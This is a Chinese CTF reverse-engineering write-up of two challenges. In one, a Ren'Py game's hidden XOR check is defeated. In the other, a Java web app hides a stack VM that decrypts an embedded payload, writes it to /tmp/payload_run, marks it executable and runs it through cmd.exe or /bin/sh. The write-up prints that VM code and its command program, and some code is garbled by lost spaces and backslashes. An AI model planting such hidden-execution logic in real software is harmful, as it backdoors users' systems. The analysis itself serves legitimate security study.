# 2026年第三届“长城杯”网数智安全大赛Reverse AK题解（含总决赛全部题目附件）

> 原文: https://www.ctfiot.com/307007.html
> ID: 307007

公众号

欢迎关注公众号【Real返璞归真】，我们将不定期分享CTF竞赛、二进制安全、JS/安卓逆向、AI安全等领域的前沿知识与技术内容。

公众号后台回复【长城杯2026】获取总决赛全部题目附件（AI、Pwn、Re、Web）下载地址。

前言

Reverse方向共三道题目：1个签到题 + 1个错题 + 1个非预期。

DokiLogic

逆向分析

游戏题目，需要对游戏进行逆向分析：

运行后会让用户输入flag：

根据文件目录名，发现该游戏使用renpy游戏引擎，包含大量.py文件：

每次启动游戏后，renpy游戏引擎会加载game目录下的.rpyc文件：

解题思路

修改renpy引擎源代码，运行游戏，引擎在加载,rpyc文件时，将其输出到日志即可得到游戏逻辑代码。

题解

在renpy/script.py的Script类下的load_file函数中将加载的.rpyc打印到日志：

运行游戏并查看日志：

得到包含乱码的Python代码（pickle序列化），手动删除乱码后可以大致看到代码逻辑：

user_input = renpy.input("just input your answer: ", length=60)
user_input = user_input.strip()
encry_input = l11111l1ll1l(user_input)
encry_input == ll111l11l111

现在需要追溯得到密文ll111l11l111和加密函数l11111l1ll1l()：

open('.1.exe', 'wb') as llll11ll1l11:
     llll11ll1l11.write(_f)
     l11l1ll111l1 = subprocess.run('./.1.exe', stdout=subprocess.PIPE).stdoutnos.remove(".1.exe")
l11l1ll111l1 = subprocess.run('./.1.exe', stdout=subprocess.PIPE).stdout
ll111l11l111 = l11l1ll111l1.decode('latin-1')
                                   
def l11111l1ll1l(ll1llll1l11l):
 llll1l111ll1 = 35
    return ''.join((chr(ord(ll1l111ll11l) ^ llll1l111ll1) for ll1l111ll11l in ll1llll1l11l))

可以发现，程序创建./1.exe程序并执行，得到密文后迅速将程序删除。

加密逻辑很简单，直接将密文异或35即可还原明文。

可以编写Python脚本进行文件监控，在.1.exe删除前将其拷贝：

import os
import shutil
import time

while True:
    if os.path.exists(".1.exe"):
        shutil.copy2(".1.exe", "123.exe")
        break
    time.sleep(0.5)

拿到.1.exe后UPX脱壳：

upx.exe -d 123.exe

动态调试拿到Buffer数组中的密文，然后编写脚本解密即可：

# def enc(param):
#     key = 35
#     return ''.join((chr(ord(x) ^ key) for x in param))

enc = [0x45,0x12,0x14,0x40,0x16,0x10,0x40,0x10,0xE,0x47,0x40,0x11,0x15,0xE,0x17,0x15,0x41,0x12,0xE,0x41,0x10,0x14,0x10,0xE,0x11,0x40,0x42,0x13,0x13,0x42,0x15,0x42,0x15,0x14,0x11,0x12]

for x in enc:
    print(chr((x) ^ 35), end='')

# f17c53c3-dc26-46b1-b373-2ca00a6a6721

notjavaweb

❝

题目描述：公司内部开发了一个Java Web应用，不过好像并没有那么简单……

逆向分析

题目给出两个文件：

流量包逻辑很清晰，是用户与服务端的交互：

用户调用login接口登录后，多次调用/api/reviews/add接口和/api/user/avatar接口，然后调用logout接口退出。

使用jadx工具对jar文件进行逆向：

发现com.example.moviereview.analytics包下有一个基于栈结构的VM虚拟机。

对其进行交叉引用，发现logout接口会调用该虚拟机：

并将vmContext的内容作为虚拟机的指令和数据，分析VmContext类：

对其appendEvent()方法进行交叉引用，发现有三个调用点：

发现前两个调用点使用了AOP编程：

切点位于updateAvatar()和addReview()方法，即在这两个函数被调用时触发：

注意：这里有个坑，addReview()方法实际上并不存在！

第三个调用点位于/api/reviews/add接口：

解题思路

逻辑非常清晰：

api/reviews/add接口和api/user/avatar接口的参数会被存储到vmContext作为虚拟机的指令和数据。

当用户调用logout接口退出登录时，会执行VM虚拟机。


```
user_input = renpy.input("just input your answer: ", length=60)
user_input = user_input.strip()
encry_input = l11111l1ll1l(user_input)
encry_input == ll111l11l111
```



```
open('.1.exe', 'wb') as llll11ll1l11:
     llll11ll1l11.write(_f)
     l11l1ll111l1 = subprocess.run('./.1.exe', stdout=subprocess.PIPE).stdoutnos.remove(".1.exe")
l11l1ll111l1 = subprocess.run('./.1.exe', stdout=subprocess.PIPE).stdout
ll111l11l111 = l11l1ll111l1.decode('latin-1')
                                   
def l11111l1ll1l(ll1llll1l11l):
 llll1l111ll1 = 35
    return ''.join((chr(ord(ll1l111ll11l) ^ llll1l111ll1) for ll1l111ll11l in ll1llll1l11l))
```



```
import os
import shutil
import time

while True:
    if os.path.exists(".1.exe"):
        shutil.copy2(".1.exe", "123.exe")
        break
    time.sleep(0.5)
```



```
upx.exe -d 123.exe
```



```
# def enc(param):
#     key = 35
#     return ''.join((chr(ord(x) ^ key) for x in param))

enc = [0x45,0x12,0x14,0x40,0x16,0x10,0x40,0x10,0xE,0x47,0x40,0x11,0x15,0xE,0x17,0x15,0x41,0x12,0xE,0x41,0x10,0x14,0x10,0xE,0x11,0x40,0x42,0x13,0x13,0x42,0x15,0x42,0x15,0x14,0x11,0x12]

for x in enc:
    print(chr((x) ^ 35), end='')

# f17c53c3-dc26-46b1-b373-2ca00a6a6721
```



```
import re

from numpy.core.defchararray import isnumeric

log_data = open('./res.txt').read()

pattern = r'"emojiAvatarId"s*:s*(d+)|"content"s*:s*"[^"]*[([^]]+)]"'

results = []
for match in re.finditer(pattern, log_data):
    if match.group(1):
        results.append(match.group(1))
    elif match.group(2):
        val = match.group(2)
        results.extend(['"' + val + '"'])

for i, val in enumerate(results, 1):
    print('vmContext.appendEvent(', end='')
    print(val, end='')
    print(');')
    
# vmContext.appendEvent("/payload.enc");
# vmContext.appendEvent(10);
# vmContext.appendEvent(17);
# vmContext.appendEvent("0");
# vmContext.appendEvent(18);
# vmContext.appendEvent("102");
# vmContext.appendEvent(18);
# vmContext.appendEvent("2");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent("2");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent(23);
# vmContext.appendEvent("58");
# vmContext.appendEvent(18);
# vmContext.appendEvent(22);
# vmContext.appendEvent("3");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent("2");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent(11);
# vmContext.appendEvent(20);
# vmContext.appendEvent(26);
# vmContext.appendEvent("1");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent(13);
# vmContext.appendEvent("2");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent(23);
# vmContext.appendEvent("4");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent("3");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent("2");
# vmContext.appendEvent(18);
# vmContext.appendEvent(25);
# vmContext.appendEvent(12);
# vmContext.appendEvent(26);
# vmContext.appendEvent("55");
# vmContext.appendEvent(18);
# vmContext.appendEvent(13);
# vmContext.appendEvent(20);
# vmContext.appendEvent(26);
# vmContext.appendEvent(20);
# vmContext.appendEvent("1");
# vmContext.appendEvent(18);
# vmContext.appendEvent(24);
# vmContext.appendEvent(20);
# vmContext.appendEvent("7");
# vmContext.appendEvent(18);
# vmContext.appendEvent(21);
# vmContext.appendEvent(26);
# vmContext.appendEvent(26);
# vmContext.appendEvent(26);
# vmContext.appendEvent("/tmp/payload_run");
# vmContext.appendEvent(15);
# vmContext.appendEvent("chmod +x /tmp/payload_run");
# vmContext.appendEvent(16);
# vmContext.appendEvent("/tmp/payload_run");
# vmContext.appendEvent(16);
```



```
public class Main {
    static VmContext vmContext = new VmContext();

    public static void main(String[] args) {
        vmContext.appendEvent("./payload.enc");
        vmContext.appendEvent(10);
        vmContext.appendEvent(17);
        vmContext.appendEvent("0");
        vmContext.appendEvent(18);
        vmContext.appendEvent("102");
        vmContext.appendEvent(18);
        vmContext.appendEvent("2");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent("2");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent(23);
        vmContext.appendEvent("58");
        vmContext.appendEvent(18);
        vmContext.appendEvent(22);
        vmContext.appendEvent("3");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent("2");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent(11);
        vmContext.appendEvent(20);
        vmContext.appendEvent(26);
        vmContext.appendEvent("1");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent(13);
        vmContext.appendEvent("2");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent(23);
        vmContext.appendEvent("4");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent("3");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent("2");
        vmContext.appendEvent(18);
        vmContext.appendEvent(25);
        vmContext.appendEvent(12);
        vmContext.appendEvent(26);
        vmContext.appendEvent("55");
        vmContext.appendEvent(18);
        vmContext.appendEvent(13);
        vmContext.appendEvent(20);
        vmContext.appendEvent(26);
        vmContext.appendEvent(20);
        vmContext.appendEvent("1");
        vmContext.appendEvent(18);
        vmContext.appendEvent(24);
        vmContext.appendEvent(20);
        vmContext.appendEvent("7");
        vmContext.appendEvent(18);
        vmContext.appendEvent(21);
        vmContext.appendEvent(26);
        vmContext.appendEvent(26);
        vmContext.appendEvent(26);
        vmContext.appendEvent("./payload_run");
        vmContext.appendEvent(15);
        vmContext.appendEvent("chmod +x ./payload_run");
        vmContext.appendEvent(16);
        vmContext.appendEvent("./payload_run");
        vmContext.appendEvent(16);

        VM vm = new VM();
        vm.generateReport(vmContext.getBuffer());
    }
}
```



```
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.List;
import java.util.Stack;

/* loaded from: movie-review-system-1.0.0.jar:BOOT-INF/classes/com/example/moviereview/analytics/AnalyticsReportGenerator.class */
publicclass VM {
    public void generateReport(List<Object> events) throws Exception {
        if (events == null || events.isEmpty()) {
            return;
        }
        Stack<Object> dataStack = new Stack<>();
        int pc = 0;
        while (pc < events.size()) {
            Object event = events.get(pc);
            try {
            } catch (Exception e) {
                System.err.println("[VM ERROR] PC: " + pc + " | Exception: " + e.getMessage());
            }
            if (event instanceof String) {
                dataStack.push(event);
            } elseif (event instanceof Integer) {
                int opcode = ((Integer) event).intValue();
                if (opcode == 21) {
                    if (!dataStack.isEmpty() && (dataStack.peek() instanceof Integer)) {
                        pc = ((Integer) dataStack.pop()).intValue();
                    }
                } elseif (opcode == 22) {
                    if (dataStack.size() >= 2) {
                        int targetPc = ((Integer) dataStack.pop()).intValue();
                        int condition = ((Integer) dataStack.pop()).intValue();
                        if (condition == 0) {
                            pc = targetPc;
                        }
                    }
                } else {
                    executeOpcode(opcode, dataStack);
                }
                pc++;
            }
            pc++;
        }
    }

    private void executeOpcode(int opcode, Stack<Object> stack) throws Exception {
        int idx;
        ProcessBuilder pb;
        byte[] resourceData;
        switch (opcode) {
            case10:
                if (!stack.isEmpty() && (stack.peek() instanceof String) && (resourceData = readResource((String) stack.pop())) != null) {
                    stack.push(resourceData);
                    break;
                }
                break;
            case11:
                if (stack.size() >= 2) {
                    Object indexObj = stack.pop();
                    Object dataObj = stack.pop();
                    if ((dataObj instanceofbyte[]) && (indexObj instanceof Integer)) {
                        byte[] data = (byte[]) dataObj;
                        int idx2 = ((Integer) indexObj).intValue();
                        if (idx2 >= 0 && idx2 < data.length) {
                            stack.push(data);
                            stack.push(Integer.valueOf(data[idx2]));
                            break;
                        }
                    }
                }
                break;
            case12:
                if (stack.size() >= 3) {
                    Object valObj = stack.pop();
                    Object indexObj2 = stack.pop();
                    Object dataObj2 = stack.pop();
                    if ((dataObj2 instanceofbyte[]) && (indexObj2 instanceof Integer) && (valObj instanceof Integer)) {
                        byte[] data2 = (byte[]) dataObj2;
                        int idx3 = ((Integer) indexObj2).intValue();
                        int val = ((Integer) valObj).intValue();
                        if (idx3 >= 0 && idx3 < data2.length) {
                            data2[idx3] = (byte) val;
                        }
                        stack.push(data2);
                        break;
                    }
                }
                break;
            case13:
                if (stack.size() >= 2) {
                    Object b = stack.pop();
                    Object a = stack.pop();
                    if ((a instanceof Integer) && (b instanceof Integer)) {
                        stack.push(Integer.valueOf(((Integer) a).intValue() ^ ((Integer) b).intValue()));
                        break;
                    }
                }
                break;
            case14:
                if (stack.size() >= 2) {
                    Object b2 = stack.pop();
                    Object a2 = stack.pop();
                    if ((a2 instanceof Integer) && (b2 instanceof Integer)) {
                        stack.push(Integer.valueOf((((Integer) a2).intValue() * ((Integer) b2).intValue()) & 255));
                        break;
                    }
                }
                break;
            case15:
                if (stack.size() >= 2) {
                    Object top = stack.pop();
                    Object next = stack.pop();
                    String path = null;
                    byte[] data3 = null;
                    if ((top instanceof String) && (next instanceofbyte[])) {
                        path = (String) top;
                        data3 = (byte[]) next;
                    } elseif ((top instanceofbyte[]) && (next instanceof String)) {
                        data3 = (byte[]) top;
                        path = (String) next;
                    }
                    if (path != null && data3 != null) {
                        writeFile(path, data3);
                        break;
                    }
                }
                break;
            case16:
                if (!stack.isEmpty() && (stack.peek() instanceof String)) {
                    String cmd = (String) stack.pop();
                    try {
                        if (true) {
                            pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                        } else {
                            pb = new ProcessBuilder("/bin/sh", "-c", cmd);
                        }
                        pb.redirectErrorStream(true);
                        pb.start();
                        break;
                    } catch (Exception e) {
                        Runtime.getRuntime().exec(cmd);
                        return;
                    }
                }
                break;
            case17:
                if (!stack.isEmpty() && (stack.peek() instanceofbyte[])) {
                    stack.push(Integer.valueOf(((byte[]) stack.peek()).length));
                    break;
                }
                break;
            case18:
                if (!stack.isEmpty() && (stack.peek() instanceof String)) {
                    try {
                        String valStr = (String) stack.pop();
                        stack.push(Integer.valueOf(Integer.parseInt(valStr)));
                        break;
                    } catch (NumberFormatException e2) {
                        return;
                    }
                }
                break;
            case19:
                if (!stack.isEmpty()) {
                    stack.push(stack.peek());
                    break;
                }
                break;
            case20:
                if (stack.size() >= 2) {
                    Object a3 = stack.pop();
                    Object b3 = stack.pop();
                    stack.push(a3);
                    stack.push(b3);
                    break;
                }
                break;
            case23:
                if (stack.size() >= 2) {
                    Object b4 = stack.pop();
                    Object a4 = stack.pop();
                    if ((a4 instanceof Integer) && (b4 instanceof Integer)) {
                        stack.push(Integer.valueOf(((Integer) a4).intValue() - ((Integer) b4).intValue()));
                        break;
                    }
                }
                break;
            case24:
                if (stack.size() >= 2) {
                    Object b5 = stack.pop();
                    Object a5 = stack.pop();
                    if ((a5 instanceof Integer) && (b5 instanceof Integer)) {
                        stack.push(Integer.valueOf(((Integer) a5).intValue() + ((Integer) b5).intValue()));
                        break;
                    }
                }
                break;
            case25:
                if (!stack.isEmpty() && (stack.peek() instanceof Integer) && (idx = ((Integer) stack.pop()).intValue()) >= 0 && idx < stack.size()) {
                    stack.push(stack.get((stack.size() - 1) - idx));
                    break;
                }
                break;
            case26:
                if (!stack.isEmpty()) {
                    stack.pop();
                    break;
                }
                break;
        }
    }

    privatebyte[] readResource(String path) throws Exception {
        if (!path.startsWith("/")) {
            path = "/" + path;
        }
        InputStream is = getClass().getResourceAsStream(path);
        if (is != null) {
            try {
                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                byte[] data = newbyte[16384];
                while (true) {
                    int nRead = is.read(data, 0, data.length);
                    if (nRead == -1) {
                        break;
                    }
                    buffer.write(data, 0, nRead);
                }
                byte[] byteArray = buffer.toByteArray();
                if (is != null) {
                    is.close();
                }
                return byteArray;
            } catch (Throwable th) {
                if (is != null) {
                    try {
                        is.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                }
                throw th;
            }
        }
        if (is != null) {
            is.close();
        }
        returnnull;
    }

    private void writeFile(String path, byte[] data) throws Exception {
        File file = new File(path);
        File parent = file.getParentFile();
        if (parent != null && !parent.exists()) {
            parent.mkdirs();
        }
        FileOutputStream fos = new FileOutputStream(file);
        try {
            fos.write(data);
            fos.close();
        } catch (Throwable th) {
            try {
                fos.close();
            } catch (Throwable th2) {
                th.addSuppressed(th2);
            }
            throw th;
        }
    }
}
```



```
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/* loaded from: movie-review-system-1.0.0.jar:BOOT-INF/classes/com/example/moviereview/analytics/VmContext.class */
publicclass VmContext {
    privatefinal List<Object> buffer = Collections.synchronizedList(new ArrayList());

    public void appendEvent(Object event) {
        this.buffer.add(event);
    }

    public List<Object> getBuffer() {
        returnnew ArrayList(this.buffer);
    }

    public void clear() {
        this.buffer.clear();
    }
}
```



```
public void generateReport(List<Object> events) throws Exception {
    if (events == null || events.isEmpty()) {
        return;
    }
    Stack<Object> dataStack = new Stack<>();
    int pc = 0;
    while (pc < events.size()) {
        Object event = events.get(pc);
        try {
        } catch (Exception e) {
            System.err.println("[VM ERROR] PC: " + pc + " | Exception: " + e.getMessage());
        }
        if (event instanceof String) {
            dataStack.push(event);
        } elseif (event instanceof Integer) {
            int opcode = ((Integer) event).intValue();
            if (opcode == 21) {
                if (!dataStack.isEmpty() && (dataStack.peek() instanceof Integer)) {
                    pc = ((Integer) dataStack.pop()).intValue();
                }
            } elseif (opcode == 22) {
                if (dataStack.size() >= 2) {
                    int targetPc = ((Integer) dataStack.pop()).intValue();
                    int condition = ((Integer) dataStack.pop()).intValue();
                    if (condition == 0) {
                        pc = targetPc;
                    }
                }
            } else {
                executeOpcode(opcode, dataStack);
            }
            pc++;
        }
        pc++;
    }
}
```



```
public void generateReport(List<Object> events) throws Exception {
    if (events == null || events.isEmpty()) {
        return;
    }
    Stack<Object> dataStack = new Stack<>();
    int pc = 0;
    while (pc < events.size()) {
        Object event = events.get(pc);
        try {
        } catch (Exception e) {
            System.err.println("[VM ERROR] PC: " + pc + " | Exception: " + e.getMessage());
        }
        if (event instanceof String) {
            dataStack.push(event);
            pc++;
        } elseif (event instanceof Integer) {
            int opcode = ((Integer) event).intValue();
            if (opcode == 21) {
                if (!dataStack.isEmpty() && (dataStack.peek() instanceof Integer)) {
                    pc = ((Integer) dataStack.pop()).intValue();
                    continue;
                }
            } elseif (opcode == 22) {
                if (dataStack.size() >= 2) {
                    int targetPc = ((Integer) dataStack.pop()).intValue();
                    int condition = ((Integer) dataStack.pop()).intValue();
                    if (condition == 0) {
                        pc = targetPc;
                        continue;
                    }
                }
            } else {
                executeOpcode(opcode, dataStack);
            }
            pc++;
        }
    }
}
```



```
08a76a304f8a7d64baace233c30d8e789e27ec1ae589e7b36252ea00ecf2a9c274b18754f4758095956a08dc1c6793e07cf91658ae232ac3935aa17c03294a625c90ba2ef4b482ffb145388829ed5554
```



```
from binascii import unhexlify

key = bytes.fromhex("4a7f2c91b35ed816fa4309cc7be5283d")
iv  = bytes.fromhex("8e1af65530c974bb2d974e1160daa73c")

ct = bytes.fromhex(
    "08a76a304f8a7d64baace233c30d8e78"
    "9e27ec1ae589e7b36252ea00ecf2a9c"
    "274b18754f4758095956a08dc1c6793"
    "e07cf91658ae232ac3935aa17c03294"
    "a625c90ba2ef4b482ffb145388829ed5554"
)

RCON = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]
SHIFT = [0, 3, 1, 2]

SBOX = [0xC5, 0xEA, 0xB8, 0x6C, 0x91, 0xA2, 0x11, 0x44,
        0x05, 0xBA, 0x76, 0x99, 0x45, 0x53, 0xEF, 0x54,
        0xA5, 0xF9, 0x90, 0x06, 0xF6, 0x28, 0xEB, 0x48,
        0x85, 0x66, 0x64, 0x5C, 0x3A, 0x0E, 0xE7, 0x1B,
        0xF5, 0x70, 0xDB, 0xA1, 0x6F, 0xE4, 0xCE, 0xCF,
        0xB6, 0xE2, 0xD9, 0xA4, 0xD2, 0xB2, 0xE9, 0xC7,
        0xE5, 0x9D, 0xFE, 0x2E, 0xFF, 0x84, 0x09, 0x50,
        0xD0, 0x41, 0x20, 0x5F, 0xD4, 0x4D, 0xAA, 0x61,
        0xDD, 0x15, 0x1F, 0x26, 0xCA, 0xFD, 0x1D, 0xBD,
        0x7A, 0x57, 0xBF, 0x46, 0x40, 0xB3, 0x2A, 0x93,
        0x96, 0x39, 0x56, 0xBE, 0xCB, 0x9C, 0x9F, 0xF1,
        0x4E, 0x49, 0x7E, 0x8E, 0xD3, 0xB9, 0xC4, 0xFA,
        0xD5, 0x67, 0x03, 0x1A, 0x58, 0x55, 0x30, 0x7F,
        0x32, 0xC3, 0x8F, 0xDF, 0xA3, 0xD1, 0x0F, 0xDA,
        0x4F, 0x88, 0x6D, 0xC1, 0x37, 0xD6, 0x62, 0x17,
        0xA7, 0x19, 0x6B, 0x27, 0x98, 0xA9, 0x7D, 0x0C,
        0x23, 0x82, 0xAD, 0x52, 0x42, 0x68, 0xDE, 0x1E,
        0xA8, 0x3B, 0x33, 0x3D, 0x43, 0x9B, 0x13, 0x0B,
        0xF0, 0xCC, 0x8C, 0x01, 0x12, 0x75, 0xEE, 0x47,
        0x07, 0x8B, 0x14, 0x2B, 0xD8, 0xAE, 0x04, 0x87,
        0x86, 0xDC, 0xBB, 0xE8, 0xE6, 0x3C, 0x78, 0x77,
        0xC2, 0xE0, 0x69, 0x29, 0x02, 0xB1, 0x35, 0xB5,
        0x00, 0x7C, 0x83, 0xC8, 0x18, 0x8A, 0x60, 0x36,
        0x24, 0xC9, 0xFB, 0x38, 0xAF, 0x80, 0xB0, 0x31,
        0xCD, 0x59, 0x94, 0xC6, 0x4C, 0xD7, 0xC0, 0x71,
        0xE1, 0xED, 0x8D, 0x79, 0x3F, 0x4B, 0x72, 0x9E,
        0x3E, 0x08, 0x2C, 0x9A, 0x0A, 0x63, 0x22, 0x5B,
        0x1C, 0x5A, 0x25, 0xF8, 0x4A, 0xF7, 0xA0, 0xE3,
        0x6A, 0x2F, 0x89, 0x74, 0x7B, 0x5E, 0x2D, 0x5D,
        0xBC, 0x95, 0xA6, 0x0D, 0x16, 0xFC, 0xAC, 0x34,
        0xF4, 0x51, 0xAB, 0x6E, 0x92, 0xEC, 0xB4, 0x97,
        0x81, 0x65, 0xF3, 0xB7, 0x73, 0x10, 0x21, 0xF2]

# ====== AES 基础函数 ======
def gmul(a, b):
    res = 0
    for _ in range(8):
        if b & 1:
            res ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi:
            a ^= 0x1b
        b >>= 1
    return res

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def pkcs7_unpad(data):
    pad = data[-1]
    if pad < 1or pad > 16:
        raise ValueError(f"bad padding: {pad}")
    return data[:-pad]

# ====== 魔改 AES-128 Key Schedule ======
def key_expand(key):
    rk = list(key) + [0] * (176 - 16)

    for i in range(4, 44):
        temp = rk[(i - 1) * 4:i * 4]

        if i % 4 == 0:
            temp = [
                SBOX[temp[1]] ^ RCON[i // 4],
                SBOX[temp[2]],
                SBOX[temp[3]],
                SBOX[temp[0]],
            ]

        for j in range(4):
            rk[i * 4 + j] = rk[(i - 4) * 4 + j] ^ temp[j]

    return rk

# ====== 状态矩阵转换 ======
# 对应 IDA 中那段奇怪的行列转换
def bytes_to_state(block):
    state = [0] * 16
    for r in range(4):
        for c in range(4):
            state[r + 4 * c] = block[4 * r + c]
    return state

def state_to_bytes(state):
    out = [0] * 16
    for r in range(4):
        for c in range(4):
            out[4 * r + c] = state[r + 4 * c]
    return bytes(out)

# ====== AES 逆过程 ======
def inv_sbox_table():
    inv = [0] * 256
    for i, x in enumerate(SBOX):
        inv[x] = i
    return inv

def add_round_key(state, round_key, rnd):
    state = state[:]
    base = rnd * 16

    for r in range(4):
        for c in range(4):
            state[r + 4 * c] ^= round_key[base + 4 * r + c]

    return state

def inv_sub_bytes(state, inv_sbox):
    return [inv_sbox[x] for x in state]

def inv_shift_rows(state):
    state = state[:]

    for row in range(1, 4):
        off = row * 4
        old = state[off:off + 4]
        s = SHIFT[row] & 3

        # 加密时是左移 s，解密时右移 s
        state[off:off + 4] = [old[(i - s) & 3] for i in range(4)]

    return state

def inv_mix_columns(state):
    state = state[:]

    for i in range(4):
        a0 = state[i]
        a1 = state[i + 4]
        a2 = state[i + 8]
        a3 = state[i + 12]

        state[i]     = gmul(14, a0) ^ gmul(11, a1) ^ gmul(13, a2) ^ gmul(9,  a3)
        state[i + 4] = gmul(9,  a0) ^ gmul(14, a1) ^ gmul(11, a2) ^ gmul(13, a3)
        state[i + 8] = gmul(13, a0) ^ gmul(9,  a1) ^ gmul(14, a2) ^ gmul(11, a3)
        state[i + 12]= gmul(11, a0) ^ gmul(13, a1) ^ gmul(9,  a2) ^ gmul(14, a3)

    return state

def decrypt_block(block, round_key, inv_sbox):
    state = bytes_to_state(block)

    # 最后一轮 AddRoundKey
    state = add_round_key(state, round_key, 10)

    # 第 9 ~ 1 轮
    for rnd in range(9, 0, -1):
        state = inv_shift_rows(state)
        state = inv_sub_bytes(state, inv_sbox)
        state = add_round_key(state, round_key, rnd)
        state = inv_mix_columns(state)

    # 第 0 轮
    state = inv_shift_rows(state)
    state = inv_sub_bytes(state, inv_sbox)
    state = add_round_key(state, round_key, 0)

    return state_to_bytes(state)

def decrypt_cbc(ciphertext, key, iv):
    round_key = key_expand(key)
    inv_sbox = inv_sbox_table()

    plaintext = b""
    prev = iv

    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i + 16]
        dec = decrypt_block(block, round_key, inv_sbox)
        plaintext += xor_bytes(dec, prev)
        prev = block

    return pkcs7_unpad(plaintext)

pt = decrypt_cbc(ct, key, iv)
print(pt.decode())
# flag{F1n@1ly_Y0u_G0t_Th1s_f1ag_and_f1nd_7h3_TRUTH_D0_Y0u_L1k3_1t?}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865063-wxsync-2026-05-01b6f95328d7c5de2dd9569795f9efa5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865064-wxsync-2026-05-e94dc3fe19e09daa8fe4e68774422afb.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865065-wxsync-2026-05-d666069ab917e45063998681adf73968.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865067-wxsync-2026-05-abcff7233356121d37d70a20496f3821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865068-wxsync-2026-05-0e07fe09bb97c563ac57720fc7e16a5a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865070-wxsync-2026-05-e7286ce2ce82ad29abaeebc89bff48b6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865073-wxsync-2026-05-f33c02e673702f17a2a8ef0a09b8c5e4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865074-wxsync-2026-05-c3de944b78b87ce90614a15340ec053e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865076-wxsync-2026-05-c508470748eeee92ed74587b73d000b8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1777865078-wxsync-2026-05-030f4516c24f7c877610e5c78bd70768.png)